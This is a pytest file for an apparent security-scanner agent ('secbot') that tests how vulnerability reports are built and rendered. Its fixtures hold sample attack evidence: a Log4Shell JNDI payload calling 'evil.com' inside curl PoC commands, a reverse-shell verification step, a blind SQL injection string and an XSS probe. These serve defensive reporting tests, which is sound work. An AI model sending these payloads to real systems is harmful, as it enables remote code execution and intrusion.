"""Report builder + render tests."""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path
from types import ModuleType

import pytest

from secbot.agent.asset_feed import AssetFeed
from secbot.agent.tools.skill import bind_skill_context
from secbot.agent.vulnerability_store import VulnerabilityStore
from secbot.cmdb import db as cmdb_db
from secbot.cmdb.models import Base
from secbot.cmdb.repo import (
    create_scan,
    list_assets,
    update_scan_status,
    upsert_asset,
    upsert_service,
    upsert_vulnerability,
)
from secbot.report.builder import (
    ReportRenderError,
    build_report_model,
    build_report_model_from_asset_entries,
)
from secbot.report.render import render_html, render_markdown
from secbot.skills.types import SkillContext

_SKILLS_ROOT = Path(__file__).resolve().parents[2] / "secbot" / "skills"


def _load(name: str) -> ModuleType:
    mod_name = f"_secbot_skill_{name.replace('-', '_')}_handler"
    if mod_name in sys.modules:
        return sys.modules[mod_name]
    spec = importlib.util.spec_from_file_location(
        mod_name, _SKILLS_ROOT / name / "handler.py"
    )
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[mod_name] = mod
    spec.loader.exec_module(mod)
    return mod


# ---------------------------------------------------------------------------
# DB fixtures (mirrors tests/cmdb/conftest.py)
# ---------------------------------------------------------------------------


@pytest.fixture()
async def cmdb_engine(tmp_path: Path):
    await cmdb_db.dispose_engine()
    db_file = tmp_path / "report-cmdb.sqlite3"
    engine = cmdb_db.init_engine(f"sqlite+aiosqlite:///{db_file}")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    yield engine
    await cmdb_db.dispose_engine()


async def _seed(actor: str = "local") -> str:
    """Insert one scan with one asset, one service, and two vulns."""
    async with cmdb_db.get_session() as session:
        scan = await create_scan(session, actor, target="10.0.0.0/24")
        await update_scan_status(session, actor, scan.id, status="running")
        asset = await upsert_asset(
            session, actor, scan_id=scan.id, target="10.0.0.5",
            ip="10.0.0.5", hostname="db.example",
        )
        svc = await upsert_service(
            session, actor, asset_id=asset.id, port=22, protocol="tcp",
            service="ssh", product="OpenSSH", version="8.4",
        )
        await upsert_vulnerability(
            session, actor, asset_id=asset.id, service_id=svc.id,
            severity="critical", category="cve", title="Log4Shell",
            cve_id="CVE-2021-44228", discovered_by="nuclei-template-scan",
            evidence={
                "summary": "RCE on /api",
                "matched_at": "http://10.0.0.5:8080/api/login",
                "request": "POST /api/login HTTP/1.1\nHost: 10.0.0.5:8080\nContent-Type: application/json\n\n{\"user\":\"${jndi:ldap://evil.com/exploit}\"}",
                "response": "HTTP/1.1 500 Internal Server Error\n\nError processing JNDI lookup",
                "curl_command": "curl -X POST http://10.0.0.5:8080/api/login -d '{\"user\":\"${jndi:ldap://evil.com/exploit}\"}'",
                "verification_steps": [
                    "Send POST request to /api/login with JNDI payload",
                    "Check server logs for outbound LDAP connection",
                    "Confirm RCE via reverse shell callback",
                ],
                "remediation": "Upgrade Log4j to 2.17.0+ and set log4j2.formatMsgNoLookups=true",
                "references": [
                    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                    "https://logging.apache.org/log4j/2.x/security.html",
                ],
            },
            raw_log_path="/tmp/raw/nuclei.jsonl",
        )
        await upsert_vulnerability(
            session, actor, asset_id=asset.id,
            severity="medium", category="exposure", title="Exposed Git",
            discovered_by="fscan-vuln-scan",
        )
        await update_scan_status(session, actor, scan.id, status="completed")
        return scan.id


# ---------------------------------------------------------------------------
# Builder + render
# ---------------------------------------------------------------------------


async def test_build_report_model_aggregates_severity(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    assert model.summary.asset_count == 1
    assert model.summary.service_count == 1
    assert model.summary.finding_count == 2
    assert model.summary.severity_counts["critical"] == 1
    assert model.summary.severity_counts["medium"] == 1
    assert model.summary.severity_counts["high"] == 0
    assert model.appendix.raw_log_paths == ["/tmp/raw/nuclei.jsonl"]


async def test_build_report_model_unknown_scan_raises(cmdb_engine):
    async with cmdb_db.get_session() as session:
        with pytest.raises(ReportRenderError):
            await build_report_model(session, "DOES-NOT-EXIST")


async def test_render_markdown_contains_key_fields(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    md = render_markdown(model)
    assert "# 安全扫描报告" in md
    assert "Log4Shell" in md
    assert "CVE-2021-44228" in md
    assert "10.0.0.5" in md
    assert "| 严重 | 1 |" in md
    # New fields
    assert "验证步骤" in md
    assert "Send POST request to /api/login with JNDI payload" in md
    assert "PoC 证据详情" in md or "证据详情" in md
    assert "修复建议" in md
    assert "Upgrade Log4j to 2.17.0+" in md
    assert "参考资料" in md
    assert "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" in md
    assert "http://10.0.0.5:8080/api/login" in md


async def test_render_html_inlines_severity_badges(cmdb_engine):
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    html = render_html(model)
    assert "<!DOCTYPE html>" in html
    assert "sev-critical" in html
    assert "Log4Shell" in html
    assert "开放服务" in html
    assert "<td>22</td><td>tcp</td><td>ssh</td><td>OpenSSH</td><td>8.4</td>" in html
    # New finding card fields
    assert "finding-card" in html
    assert "验证步骤" in html
    assert "Send POST request to /api/login with JNDI payload" in html
    assert "PoC 请求" in html or "系统响应" in html or "证据详情" in html
    assert "修复建议" in html
    assert "Upgrade Log4j to 2.17.0+" in html
    assert "参考资料" in html
    assert "http://10.0.0.5:8080/api/login" in html
    assert "pre.evidence" in html or 'class="evidence"' in html


async def test_builder_extracts_extended_evidence_fields(cmdb_engine):
    """build_report_model must populate the new ReportFinding fields."""
    scan_id = await _seed()
    async with cmdb_db.get_session() as session:
        model = await build_report_model(session, scan_id)
    # Find the Log4Shell finding
    log4shell = None
    for asset in model.assets:
        for f in asset.findings:
            if f.title == "Log4Shell":
                log4shell = f
                break
    assert log4shell is not None
    assert log4shell.affected_url == "http://10.0.0.5:8080/api/login"
    assert log4shell.evidence_summary == "RCE on /api"
    assert len(log4shell.verification_steps) == 3
    assert "JNDI payload" in log4shell.verification_steps[0]
    assert log4shell.remediation is not None
    assert "Log4j" in log4shell.remediation
    assert len(log4shell.references) == 2
    assert log4shell.evidence_detail is not None
    assert "POST /api/login" in log4shell.evidence_detail


async def test_build_report_model_from_asset_entries_groups_findings() -> None:
    feed = AssetFeed()
    await feed.append(
        kind="tech",
        agent_name="crawl_web",
        payload={
            "host": "111.228.2.47:8080",
            "stack": ["PHP", "Apache", "Pikachu"],
        },
    )
    await feed.append(
        kind="vuln",
        agent_name="vuln_scan",
        payload={
            "url": "http://111.228.2.47:8080/vul/sqli/sqli_id.php",
            "param": "id (POST)",
            "type": "sqli_boolean_blind",
            "severity": "critical",
            "evidence": "sqlmap-detect confirmed boolean-based blind SQL injection",
            "payload": "id=1 AND 3327=3327",
        },
    )
    await feed.append(
        kind="vuln",
        agent_name="vuln_detec",
        payload={
            "url": "http://111.228.2.47:8080/vul/xss/xss_reflected_get.php",
            "param": "message",
            "type": "xss-reflected",
            "confidence": "high",
            "evidence": "<script>alert(1)</script> reflected unsanitized",
        },
    )

    model = build_report_model_from_asset_entries(
        await feed.to_dict_list(),
        scan_id="websocket_test",
        target="http://111.228.2.47:8080",
    )

    assert model.summary.asset_count == 1
    assert model.summary.finding_count == 2
    assert model.summary.severity_counts["critical"] == 1
    assert model.summary.severity_counts["high"] == 1
    asset = model.assets[0]
    assert asset.target == "111.228.2.47:8080"
    assert asset.findings[0].title.startswith("sqli_boolean_blind")
    assert asset.findings[0].category == "injection"
    assert asset.findings[0].affected_url == "http://111.228.2.47:8080/vul/sqli/sqli_id.php"
    assert "3327=3327" in (asset.findings[0].evidence_detail or "")
    assert asset.findings[1].category == "xss"


# ---------------------------------------------------------------------------
# Skill handlers
# ---------------------------------------------------------------------------


def _ctx(tmp_path: Path) -> SkillContext:
    sd = tmp_path / "scan-001"
    sd.mkdir(parents=True, exist_ok=True)
    return SkillContext(scan_id="scan-001", scan_dir=sd)


async def test_report_html_skill_writes_file(cmdb_engine, tmp_path: Path):
    """report-html uses VulnerabilityStore as primary data source."""
    scan_id = "vuln-store-scan"
    store = VulnerabilityStore()
    await store.report(
        agent_name="nuclei-template-scan",
        title="Log4Shell RCE via JNDI injection",
        severity="critical",
        description="Remote code execution via JNDI lookup injection in user-agent header",
        exploitation_proof="POST /api/login HTTP/1.1\nHost: 10.0.0.5:8080\n\nHTTP/1.1 500 Internal Server Error",
        verification_method="automated_scan",
        cvss=9.8,
        endpoint="http://10.0.0.5:8080/api/login",
        poc_script_code="curl -X POST http://10.0.0.5:8080/api/login -H 'User-Agent: ${jndi:ldap://evil.com/exploit}'",
        remediation_steps="Upgrade Log4j to 2.17.0+",
    )
    await store.report(
        agent_name="fscan-vuln-scan",
        title="Exposed Git repository configuration",
        severity="medium",
        description="Git repository configuration file publicly accessible at /.git/config",
        exploitation_proof="GET /.git/config HTTP/1.1\n\nHTTP/1.1 200 OK\n[core]\nrepositoryformatversion = 0",
        verification_method="automated_scan",
        endpoint="http://10.0.0.5/.git/config",
    )

    mod = _load("report-html")
    ctx = _ctx(tmp_path)
    bind_skill_context(
        scan_id=scan_id, scan_dir=ctx.scan_dir, vulnerability_store=store
    )
    res = await mod.run({}, ctx)
    assert res.summary["status"] == "ok"
    assert res.summary["source"] == "vulnerability_store"
    out = Path(res.summary["report_path"])
    assert out.exists()
    assert out.name == "report.html"
    text = out.read_text(encoding="utf-8")
    assert "<!DOCTYPE html>" in text
    assert "Log4Shell" in text
    assert res.summary["finding_count"] == 2


async def test_report_html_skill_empty_scan(cmdb_engine, tmp_path: Path):
    # Create an empty scan with no assets.
    async with cmdb_db.get_session() as session:
        scan = await create_scan(session, "local", target="10.10.10.10")
    mod = _load("report-html")
    ctx = _ctx(tmp_path)
    bind_skill_context(scan_id=scan.id, scan_dir=ctx.scan_dir)
    res = await mod.run({}, ctx)
    assert res.summary["status"] == "empty"
    assert res.summary["report_path"] is None
    assert res.summary["asset_count"] == 0
    assert res.summary["finding_count"] == 0


async def test_report_html_skill_uses_vulnerability_store_entries(
    cmdb_engine,
    tmp_path: Path,
):
    """report-html renders VulnerabilityStore entries when CMDB is empty."""
    scan_id = "websocket_111"
    store = VulnerabilityStore()
    await store.report(
        agent_name="vuln_scan",
        title="Boolean-based blind SQL injection in id parameter",
        severity="critical",
        description="sqlmap-detect confirmed boolean-based blind SQL injection on id POST parameter",
        exploitation_proof="POST /vul/sqli/sqli_id.php HTTP/1.1\n\nid=1 AND 3327=3327\n\nHTTP/1.1 200 OK (response confirms injection)",
        verification_method="automated_scan",
        endpoint="http://111.228.2.47:8080/vul/sqli/sqli_id.php",
        poc_description="id=1 AND 3327=3327",
    )
    await store.report(
        agent_name="vuln_scan",
        title="Git configuration file exposed",
        severity="medium",
        description="nuclei-template-scan: Git Configuration - Detect",
        exploitation_proof="GET /.git/config HTTP/1.1\n\nHTTP/1.1 200 OK\n[core]",
        verification_method="automated_scan",
        endpoint="http://111.228.2.47:8080/.git/config",
    )

    mod = _load("report-html")
    ctx = _ctx(tmp_path)
    bind_skill_context(
        scan_id=scan_id, scan_dir=ctx.scan_dir, vulnerability_store=store
    )

    res = await mod.run(
        {
            "target": "http://111.228.2.47:8080",
            "title": "Pikachu Security Report",
            "type": "vuln",
        },
        ctx,
    )

    assert res.summary["status"] == "ok"
    assert res.summary["source"] == "vulnerability_store"
    assert res.summary["finding_count"] == 2
    out = Path(res.summary["report_path"])
    assert out.exists()
    text = out.read_text(encoding="utf-8")
    assert "111.228.2.47:8080" in text
    assert "SQL injection" in text
    assert "Git configuration" in text

    # CMDB should remain untouched (no CMDB writes from VulnerabilityStore path)
    async with cmdb_db.get_session() as session:
        assert await list_assets(session, "local", scan_id=scan_id) == []


async def test_report_html_merges_vulnerability_store_and_jsonl(
    cmdb_engine,
    tmp_path: Path,
):
    """VulnerabilityStore and session JSONL discoveries are merged."""
    target = "http://111.228.2.47:8080"

    store = VulnerabilityStore()
    await store.report(
        agent_name="vuln_scan",
        title="Current store finding",
        severity="critical",
        description="Active vulnerability found in current scan session",
        exploitation_proof="GET /current.php?id=1 HTTP/1.1\n\nHTTP/1.1 200 OK (SQL error reflected)",
        verification_method="automated_scan",
        endpoint="http://111.228.2.47:8080/current.php",
    )

    mod = _load("report-html")
    ctx = _ctx(tmp_path)
    sessions_dir = tmp_path / "sessions"
    sessions_dir.mkdir()
    (sessions_dir / "websocket_current.jsonl").write_text(
        json.dumps(
            {
                "_kind": "agent_event",
                "timestamp": "2026-06-12T12:00:00+00:00",
                "sender_id": "vuln_scan",
                "agent_event": {
                    "type": "tool_call",
                    "status": "ok",
                    "tool_name": "asset_push",
                    "tool_call_id": "call-batch-vuln",
                    "agent_name": "vuln_scan",
                    "tool_args": {
                        "kind": "vuln",
                        "payloads": [
                            {
                                "url": "http://111.228.2.47:8080/.git/config",
                                "type": "git_repo_exposed",
                                "severity": "medium",
                                "evidence": "[core] repositoryformatversion = 0",
                            },
                            {
                                "url": "http://111.228.2.47:8080/Dockerfile",
                                "type": "dockerfile_disclosure",
                                "severity": "low",
                                "evidence": "FROM php:apache",
                            },
                        ],
                    },
                },
            },
            ensure_ascii=False,
        )
        + "\n",
        encoding="utf-8",
    )
    bind_skill_context(
        scan_id="websocket_current",
        scan_dir=ctx.scan_dir,
        vulnerability_store=store,
    )

    res = await mod.run({"target": target, "type": "vuln"}, ctx)

    assert res.summary["status"] == "ok"
    assert res.summary["source"] == "vulnerability_store+session_jsonl"
    assert res.summary["finding_count"] == 3
    text = Path(res.summary["report_path"]).read_text(encoding="utf-8")
    assert "Current store finding" in text
    assert "git_repo_exposed" in text
    assert "dockerfile_disclosure" in text


async def test_report_html_blocks_normal_report_when_subagent_interrupted(
    cmdb_engine,
    tmp_path: Path,
):
    """Normal reports do not run when latest upstream work is interrupted."""
    scan_id = "websocket_interrupted"
    sessions_dir = tmp_path / "sessions"
    sessions_dir.mkdir()
    (sessions_dir / f"{scan_id}.jsonl").write_text(
        "\n".join(
            [
                json.dumps(
                    {
                        "_kind": "agent_event",
                        "timestamp": "2026-06-12T12:00:00+00:00",
                        "sender_id": "vuln_scan",
                        "agent_event": {
                            "type": "subagent_done",
                            "task_id": "task-1",
                            "agent_name": "vuln_scan",
                            "label": "vuln_scan",
                            "status": "incomplete",
                        },
                    },
                    ensure_ascii=False,
                ),
                json.dumps(
                    {
                        "_kind": "agent_event",
                        "timestamp": "2026-06-12T12:01:00+00:00",
                        "sender_id": "vuln_scan",
                        "agent_event": {
                            "type": "tool_call",
                            "status": "ok",
                            "tool_name": "asset_push",
                            "tool_call_id": "call-vuln",
                            "agent_name": "vuln_scan",
                            "tool_args": {
                                "kind": "vuln",
                                "payload": {
                                    "url": "http://example.test/.git/config",
                                    "type": "git_repo_exposed",
                                    "severity": "medium",
                                    "evidence": "[core]",
                                },
                            },
                        },
                    },
                    ensure_ascii=False,
                ),
            ]
        )
        + "\n",
        encoding="utf-8",
    )

    mod = _load("report-html")
    ctx = _ctx(tmp_path)
    bind_skill_context(scan_id=scan_id, scan_dir=ctx.scan_dir)

    blocked = await mod.run({"target": "http://example.test"}, ctx)

    assert blocked.summary["status"] == "blocked_interrupted_dependencies"
    assert blocked.summary["report_path"] is None
    assert blocked.summary["interrupted_agents"][0]["agent_name"] == "vuln_scan"

    partial = await mod.run(
        {"target": "http://example.test", "allow_partial": True},
        ctx,
    )

    assert partial.summary["status"] == "ok"
    assert partial.summary["partial"] is True
    assert partial.summary["finding_count"] == 1
    assert partial.summary["interrupted_agents"][0]["agent_name"] == "vuln_scan"
